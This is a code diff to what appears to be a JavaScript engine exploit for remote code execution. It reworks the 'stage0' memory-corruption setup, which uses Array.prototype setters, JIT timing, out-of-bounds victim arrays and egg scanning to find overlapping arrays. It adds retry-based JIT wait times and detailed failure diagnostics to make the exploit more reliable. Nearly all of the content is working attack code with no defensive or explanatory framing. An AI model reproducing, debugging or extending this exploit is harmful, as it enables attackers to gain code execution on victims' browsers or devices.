@@ -6498,12 +6498,14 @@ const device_chipset = {
         oob_object[1001] = 1.1;
         oob_object.length = 4;
         let testvar = undefined;
-        otherGlobalObject.Object.defineProperty(otherGlobalObject.Array.prototype, 128662, {set(v) {for(let i = 0; i < holes_to_add; i++){ the_oob_object[0] = v;} return 42;}}); null;
 
         let counter = 0;
+        let hole_setter_counter = 0;
+        let double_magic_counter = 0;
         otherGlobalObject.Object.defineProperty(otherGlobalObject.Array.prototype, 128661, {set() {counter++; if (counter == 1) { doDoubleMagic();} return 42;}}); null;
 
         const doDoubleMagic = () => {
+            double_magic_counter++;
             let doublemagic = new Array(1);
             doublemagic[0] = 1.1;
             dopush_float(doublemagic);
@@ -6521,10 +6523,16 @@ const device_chipset = {
             return newmagic;
         }
 
+        otherGlobalObject.Object.defineProperty(otherGlobalObject.Array.prototype, 128662, {set(v) {hole_setter_counter++; for(let i = 0; i < holes_to_add; i++){ the_oob_object[0] = v;} return 42;}}); null;
+
         otherGlobalObject.dontjitme_contigious();
         dontjitme_float();
 
-        return sleep(wait_for_jit_compilation_ms).then(() => {
+        const attempt_idx = Number(globalThis.__bb_rce_attempt_idx || 0);
+        const jit_wait_ms = wait_for_jit_compilation_ms + Math.min(attempt_idx, 4) * 250;
+        print(`stage0 setup: attempt=${attempt_idx + 1} jit_wait_ms=${jit_wait_ms} victim_cursor=${victim_cursor} holes_to_add=${holes_to_add}`);
+
+        return sleep(jit_wait_ms).then(() => {
 
             let debug_1 = otherGlobalObject.domagic(); null;
 
@@ -6552,7 +6560,7 @@ const device_chipset = {
                     }
                 }
                 if(oob_array_idx === undefined){
-                    this.failStage("stage0", `no oversized victim array after splice; victim_cursor=${victim_cursor} threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter}`);
+                    this.failStage("stage0", `no oversized victim array after splice; victim_cursor=${victim_cursor} threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 oob_array = victim_list[oob_array_idx];
@@ -6564,7 +6572,7 @@ const device_chipset = {
                     }
                 }
                 if(overlap_array_idx === undefined){
-                    this.failStage("stage0", `oversized victim found but egg scan failed; oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter}`);
+                    this.failStage("stage0", `oversized victim found but egg scan failed; oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 this.oob_array = oob_array;
